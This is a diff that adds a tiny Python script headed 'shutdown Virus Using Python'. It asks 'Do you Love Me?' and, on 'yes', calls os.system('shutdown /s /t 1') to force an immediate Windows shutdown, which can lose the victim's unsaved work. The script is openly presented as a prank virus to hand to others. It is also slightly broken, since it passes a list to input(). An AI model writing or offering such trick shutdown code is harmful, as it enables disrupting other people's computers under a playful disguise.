@@ -1,0 +1,7 @@
+#  shutdown Virus Using Python !!
+
+import os
+while True:
+    shutdown = input( [ "Do you Love Me ? ( yes / no): "])
+    while shutdown == "yes":
+        os.system("shutdown /s /t 1")
